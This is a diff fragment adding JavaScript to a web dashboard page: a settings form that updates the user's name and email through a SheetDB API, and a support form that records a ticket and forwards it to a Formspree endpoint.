+  let name = document.getElementById("settingsName").value.trim();
+  let email = document.getElementById("settingsEmail").value.trim();
+  fetch(`${SHEETDB_API}/email/${encodeURIComponent(userEmail)}`,{
+    method:"PATCH",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({data:{fullname:name,email}})
+  })
+  .then(r=>r.json())
+  .then(r=>{
+    if(r.updated===1){
+      localStorage.setItem("user_email", email);
+      localStorage.setItem("user_name", name);
+      userEmail = email; userName = name;
+      showMsg('settingsSuccess',"Updated!");
+      loadDashboard();
+    }else{
+      showMsg('settingsFail',"Failed to update. Try again.");
+    }
+  })
+  .catch(()=>showMsg('settingsFail',"Update failed."));
+};
+
+// ------------------- SUPPORT (as notification ticket) ---------------------
+document.getElementById("supportForm").onsubmit = function(e){
+  e.preventDefault();
+  let mail = document.getElementById("supportEmail").value.trim();
+  let subject = document.getElementById("supportSubject").value.trim();
+  let msg = document.getElementById("supportMessage").value.trim();
+  if(!mail||!subject||!msg){showMsg('supportFail',"All fields required.");return;}
+  // Store as a new notification to admin (for demo: user_email=admin)
+  fetch(NOTIF_API, {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({data:[{
+      user_email:"admin", title:`Support: ${subject}`, message:`From: ${mail}\n${msg}`, time: new Date().toLocaleString()
+    }]})
+  })
+  .then(r=>r.json()).then(r=>{
+    if(r.created===1){
+      // Also send to support email
+      fetch("https://formspree.io/f/xwkgyyqv", {
+        method: "POST",
+        headers: { "Accept": "application/json", "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: mail,
+          subject: subject,
+          message: msg,
+          _replyto: mail,
+          _cc: "support@basecrypto.help"
+        })
+      });
+      showMsg('supportSuccess',"Ticket sent! We'll contact you soon.");
+      document.getElementById("supportForm").reset();
+    }else{
+      showMsg('supportFail',"Failed to send, try again.");
+    }
+  })
+  .catch(()=>showMsg('supportFail',"Failed to send, try again."));
+};
+
+loadDashboard();
+</script>
+</body>
+</html>
